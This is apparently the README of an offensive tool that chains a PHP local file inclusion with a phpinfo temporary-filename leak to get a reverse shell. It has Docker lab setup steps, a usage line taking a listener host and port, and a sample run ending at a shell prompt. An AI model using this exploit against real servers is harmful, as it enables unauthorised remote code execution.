# phpinfo_lfi

## Summary

PHP store temporary uploaded files during processing. A race condition is possible if you abuse a lfi
to get a reverse_tcp as phpinfo leak the temporary filename.

This is just rewrite of phpinfolfi.py to make it simpiler to use
Reference: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

## Usage

Start docker container with lfi-php5 if you want to test this locally

```sh
 phpinfo_lfi  master ⦿ docker-compose build
Building lfi-php5
Step 1/9 : FROM tutum/apache-php
 ---> 2e233ad9329b
Step 2/9 : MAINTAINER Mikael Kall <kall.micke@gmail.com>
 ---> Using cache
 ---> 25df34b016d9
Step 3/9 : EXPOSE 80
 ---> Using cache
 ---> bb6176966e6f
Step 4/9 : ADD app/index.php /app/index.php
 ---> Using cache
 ---> 222c78d23b2f
Step 5/9 : ADD app/info.php /app/info.php
 ---> Using cache
 ---> 07abc827cc67
Step 6/9 : ADD app/home.php /app/home.php
 ---> Using cache
 ---> c1198fcf4d25
Step 7/9 : ADD app/troll.jpg /app/troll.jpg
 ---> Using cache
 ---> 54f3e46a68f8
Step 8/9 : ADD app/php.ini /etc/php5/apache2/php.ini
 ---> Using cache
 ---> cd070e65988c
Step 9/9 : ADD app/php.ini /etc/php5/cli/php.ini
 ---> Using cache
 ---> 2582f28e67db
Successfully built 2582f28e67db
Successfully tagged phpinfolfi_lfi-php5:latest

⬢  phpinfo_lfi  master ⦿ docker-compose up -d
Creating network "phpinfolfi_default" with the default driver
Creating phpinfolfi_lfi-php5_1 ... done
```

Verify that container is running.

```sh
phpinfo_lfi  master ⦿ docker ps
CONTAINER ID        IMAGE                 COMMAND             CREATED             STATUS              PORTS                  NAMES
54fc510cedde        phpinfolfi_lfi-php5   "/run.sh"           18 seconds ago      Up 17 seconds       0.0.0.0:8080->80/tcp   phpinfolfi_lfi-php5_1
```

Run ./phpinfo_lfi to get the usage menu.

```sh
⬢  phpinfo_lfi  master ⦿ ./phpinfo_lfi.py

█ ▄▄   ▄  █ █ ▄▄  ▄█    ▄   ▄████  ████▄ █    ▄████  ▄█
█   █ █   █ █   █ ██     █  █▀   ▀ █   █ █    █▀   ▀ ██
█▀▀▀  ██▀▀█ █▀▀▀  ██ ██   █ █▀▀    █   █ █    █▀▀    ██
█     █   █ █     ▐█ █ █  █ █      ▀████ ███▄ █      ▐█
 █       █   █     ▐ █  █ █  █               ▀ █      ▐
  ▀     ▀     ▀      █   ██   ▀                 ▀

[nighter@nighter.se]

Usage: ./phpinfo_lfi.py <URL> <LFI> <LHOST> <LPORT> [threads]

EXAMPLE: ./phpinfo_lfi.py 'http://127.0.0.1:8080/phpinfo.php' 'index.php?file=' 10.10.14.24 1337 300
```        

Run the exploit.

```sh
⬢  phpinfo_lfi  master ⦿ ./phpinfo_lfi.py 'http://127.0.0.1:8080/info.php' 'index.php?file=' 10.100.44.59 1337 300
Getting initial offset... found [tmp_name] at 121638
Spawning worker pool (300)...
[+] Netcat port: 1337
$
```
